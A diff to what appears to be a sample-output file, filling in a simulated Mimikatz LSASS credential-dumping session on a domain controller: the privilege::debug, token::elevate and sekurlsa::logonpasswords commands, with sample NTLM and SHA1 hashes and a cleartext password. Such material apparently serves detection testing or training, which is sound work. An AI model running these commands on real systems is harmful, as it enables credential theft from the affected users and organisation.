@@ -1,15 +1,45 @@
-# Sample Mimikatz credential-dumping session output
-# Replace with your actual captured output.
+# ==============================================================================
+# Captured Attack Simulation Output: Mimikatz LSASS Memory Dump (T1003.001)
+# Attacker: Elevated Session on DC-01.corp.local
+# Target: lsass.exe process memory
+# ==============================================================================
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2023 17:19:55
+ .## ^ ##.  "A La Clé, Des Gens Sans Clé" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##  > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'  Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'   > https://pingcastle.com / https://mysmartlogon.com ***/
 
 mimikatz # privilege::debug
 Privilege '20' OK
 
+mimikatz # token::elevate
+Token Impersonation: OK -> SYSTEM
+
 mimikatz # sekurlsa::logonpasswords
-Authentication Id : 0 ; 123456
+Authentication Id : 0 ; 487213 (00000000:00076f2d)
 Session           : Interactive from 1
 User Name         : john.doe
 Domain            : CORP
+Logon Server      : DC-01
+Logon Time        : 8/21/2026 10:06:10 AM
+SID               : S-1-5-21-382910482-192837461-928374612-1104
         msv :
          [00000003] Primary
          * Username : john.doe
+         * Domain   : CORP
          * NTLM     : e19ccf75ee54e06b06a5907af13cef42
+         * SHA1     : 893e98f0293d01bfa28394cf8104859a82740192
+        tspkg :
+        wdigest :
+         * Username : john.doe
+         * Domain   : CORP
+         * Password : Summer2024!
+        kerberos :
+         * Username : john.doe
+         * Domain   : CORP.LOCAL
+         * Password : Summer2024!
+
+mimikatz # exit
+"Bye!"
